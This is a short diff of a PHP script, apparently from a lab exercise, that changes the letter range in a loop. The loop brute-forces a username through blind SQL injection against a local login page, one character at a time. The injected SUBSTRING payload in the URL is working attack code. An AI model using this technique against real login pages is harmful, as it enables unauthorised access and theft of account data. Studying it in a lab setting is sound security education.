@@ -8,7 +8,7 @@
 
 
 for ($i = 1; $i <= 5; $i++) {
-    foreach (range('A', 'z') as $letter){
+    foreach (range('a', 'z') as $letter){
          //echo "$letter \n";
     	$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,$i,1)%20=%20%27$letter%27%20--%20";
 		$result = file_get_contents($url);
